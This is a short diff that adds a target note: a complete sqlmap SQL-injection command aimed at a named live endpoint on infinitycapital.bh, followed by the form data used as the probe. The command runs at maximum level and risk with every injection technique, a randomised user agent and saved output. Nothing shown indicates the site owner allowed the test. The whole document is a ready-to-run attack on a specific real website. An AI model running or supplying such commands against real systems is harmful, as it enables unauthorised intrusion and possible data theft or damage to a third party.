@@ -1,0 +1,3 @@
+https://www.infinitycapital.bh/api/send (POST)  # /usr/bin/sqlmap -u https://www.infinitycapital.bh/api/send --data=fname=sqlmapProbe&lname=Security&areacode=973&tel=5551234&cname=QA+Tester&subject=Hello+there&msg=Testing+message+body&check=on&targets=probe@relay.invalid --batch --level=5 --risk=3 --dbms= --string=\"error\":null --delay=5 --timeout=20 --retries=1 --threads=1 --technique=BEUSTQ --time-sec=8 --random-agent --output-dir=tool_outputs/w40_sqlmap_send --flush-session
+
+fname=sqlmapProbe&lname=Security&areacode=973&tel=5551234&cname=QA Tester&subject=Hello there&msg=Testing message body&check=on&targets=probe@relay.invalid
